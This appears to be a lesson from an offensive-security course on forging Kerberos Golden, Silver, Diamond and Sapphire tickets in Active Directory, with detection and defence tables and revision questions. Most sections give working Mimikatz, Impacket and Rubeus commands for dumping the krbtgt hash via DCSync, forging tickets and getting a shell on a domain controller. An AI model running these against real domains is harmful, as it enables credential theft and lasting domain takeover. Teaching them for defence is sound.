# Silver and Golden Tickets

## Unit 4 - Topic 5 | Credential Attacks

---

## Overview

**Golden and Silver Tickets** are forged Kerberos tickets that provide persistent access to Active Directory. A **Golden Ticket** uses the krbtgt hash to forge TGTs granting access to ANY service, while a **Silver Ticket** uses a service account's hash to forge TGS tickets for a specific service.

---

## 1. Golden Ticket

```
GOLDEN TICKET:

WHAT: Forged TGT (Ticket Granting Ticket)
KEY:  Encrypted with krbtgt password hash
GIVES: Access to ANY service in the domain
LASTS: Until krbtgt password is changed TWICE

REQUIREMENTS:
├── krbtgt NTLM hash (requires Domain Admin / DCSync)
├── Domain SID (S-1-5-21-...)
├── Domain name
└── Username to impersonate (can be fake!)

HOW IT WORKS:
┌──────────┐   Forged TGT (signed with krbtgt hash)   ┌──────┐
│ Attacker │ ────────────────────────────────────────→ │  KDC │
│          │   "I'm Administrator, give me TGS"        │      │
│          │                                           │      │
│          │   TGS for requested service               │      │
│          │ ←──────────────────────────────────────── │      │
└──────────┘   KDC trusts the TGT (valid signature!)  └──────┘

CRITICAL POINTS:
├── User doesn't need to exist in AD!
├── Can include any group SIDs (Domain Admins, etc.)
├── Survives password changes (except krbtgt)
├── Default ticket lifetime: 10 years (configurable)
└── Only invalidated by changing krbtgt password TWICE
```

```bash
# === CREATING A GOLDEN TICKET ===

# Step 1: Get krbtgt hash (need DA/DCSync):
# Mimikatz:
lsadump::dcsync /user:corp\krbtgt
# Output: NTLM hash of krbtgt

# Impacket:
secretsdump.py corp.local/admin:pass@dc01 \
  -just-dc-user krbtgt

# Step 2: Get Domain SID:
# PowerView:
Get-DomainSID    # S-1-5-21-1234567890-1234567890-1234567890

# Step 3: Forge Golden Ticket:
# Mimikatz:
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-DOMAIN-SID \
  /krbtgt:KRBTGT_NTLM_HASH \
  /ptt
# /ptt: Pass the ticket (inject immediately)

# Or save to file:
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-DOMAIN-SID \
  /krbtgt:KRBTGT_NTLM_HASH \
  /ticket:golden.kirbi

# Impacket:
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... \
  -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py corp.local/Administrator@dc01 -k -no-pass

# Step 4: Use the ticket:
dir \\dc01\c$                    # Access DC
psexec \\dc01 cmd.exe            # Shell on DC
```

---

## 2. Silver Ticket

```
SILVER TICKET:

WHAT: Forged TGS (service ticket)
KEY:  Encrypted with SERVICE ACCOUNT hash (not krbtgt)
GIVES: Access to ONE specific service
LASTS: Until service account password changes

REQUIREMENTS:
├── Service account NTLM hash
├── Domain SID
├── Service SPN
└── Target hostname

ADVANTAGE OVER GOLDEN TICKET:
├── Never touches the DC (no TGT request)
├── Much harder to detect
├── No DC authentication logs
└── Only the target service validates it

DISADVANTAGE:
├── Limited to one service
├── Requires specific service account hash
└── PAC validation may detect it (if enabled)
```

```bash
# === CREATING A SILVER TICKET ===

# Common services to forge:
# CIFS (file shares): cifs/server.corp.local
# HTTP (web):         http/server.corp.local
# MSSQL:              MSSQLSvc/sql01.corp.local:1433
# WinRM:              http/server.corp.local (+ HOST)
# LDAP:               ldap/dc01.corp.local

# Mimikatz:
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-DOMAIN-SID \
  /target:server.corp.local \
  /service:cifs \
  /rc4:SERVICE_ACCOUNT_NTLM_HASH \
  /ptt

# Access the service:
dir \\server.corp.local\c$

# === SILVER TICKET FOR DC ===
# Using DC's machine account hash:
# CIFS (file access to DC):
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-DOMAIN-SID \
  /target:dc01.corp.local /service:cifs \
  /rc4:DC_MACHINE_HASH /ptt

# LDAP (DCSync without DA!):
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-DOMAIN-SID \
  /target:dc01.corp.local /service:ldap \
  /rc4:DC_MACHINE_HASH /ptt
# Then: lsadump::dcsync /user:corp\krbtgt

# HOST (scheduled tasks, WMI):
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-DOMAIN-SID \
  /target:dc01.corp.local /service:host \
  /rc4:DC_MACHINE_HASH /ptt
```

---

## 3. Golden vs Silver Comparison

| Feature | Golden Ticket | Silver Ticket |
|---------|:------------:|:-------------:|
| **Forges** | TGT | TGS |
| **Key needed** | krbtgt hash | Service account hash |
| **Scope** | Entire domain | One service |
| **Contacts DC** | Yes (for TGS) | No |
| **Detection** | Moderate | Very hard |
| **Persistence** | Until krbtgt changed 2x | Until svc acct password changes |
| **Requires DA** | Yes (for krbtgt hash) | No (just service hash) |
| **Flexibility** | Access anything | Limited to one SPN |

---

## 4. Diamond and Sapphire Tickets

```
NEWER TICKET ATTACKS (Harder to Detect):

DIAMOND TICKET:
├── Requests a REAL TGT from the DC
├── Then MODIFIES it (decrypts with krbtgt hash)
├── Adds privileged groups (Domain Admins)
├── Has legitimate metadata (unlike Golden Tickets)
├── Much harder to detect than Golden Ticket
└── Rubeus: diamond command

# Rubeus Diamond Ticket:
.\Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY \
  /user:normaluser /password:pass /enctype:aes \
  /domain:corp.local /dc:dc01 /ptt

SAPPHIRE TICKET:
├── Similar to Diamond but uses S4U2Self + U2U
├── Gets real PAC from DC
├── Replaces PAC in forged ticket
├── Even more legitimate-looking than Diamond
└── Extremely difficult to detect
```

---

## 5. Detection and Defense

| Defense | Golden Ticket | Silver Ticket |
|---------|:------------:|:-------------:|
| **Change krbtgt password** (2x) | ✅ Invalidates | ❌ No effect |
| **Change service password** | ❌ No effect | ✅ Invalidates |
| **PAC validation** | Limited help | ✅ Detects some |
| **Credential Guard** | ✅ Prevents hash theft | ✅ Prevents hash theft |
| **Monitor Event 4769** | ✅ Unusual TGS requests | ❌ No DC logs |
| **Monitor TGT lifetime** | ✅ Abnormally long tickets | N/A |

```powershell
# Reset krbtgt password (must do TWICE):
# First reset:
Reset-KrbtgtKeyInteractive
# Wait for replication (at least 10-12 hours)
# Second reset:
Reset-KrbtgtKeyInteractive
# All Golden Tickets are now invalid!
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Golden Ticket** | Forged TGT using krbtgt hash → access everything |
| **Silver Ticket** | Forged TGS using service hash → access one service |
| **Diamond Ticket** | Modified real TGT — harder to detect |
| **Invalidation** | Golden: krbtgt reset 2x; Silver: service password change |
| **Detection** | Golden: Event 4769; Silver: nearly undetectable |
| **Best defense** | Credential Guard + regular krbtgt rotation |

---

## Quick Revision Questions

1. **What hash is needed for a Golden Ticket?**
2. **Why must krbtgt password be changed twice to invalidate Golden Tickets?**
3. **Why are Silver Tickets harder to detect than Golden Tickets?**
4. **What is a Diamond Ticket and how does it differ?**
5. **What service do you forge for file share access?**

---

[← Previous: Kerberoasting](04-kerberoasting.md) | [Next: DCSync Attack →](06-dcsync-attack.md)

---

*Unit 4 - Topic 5 of 6 | [Back to README](../README.md)*
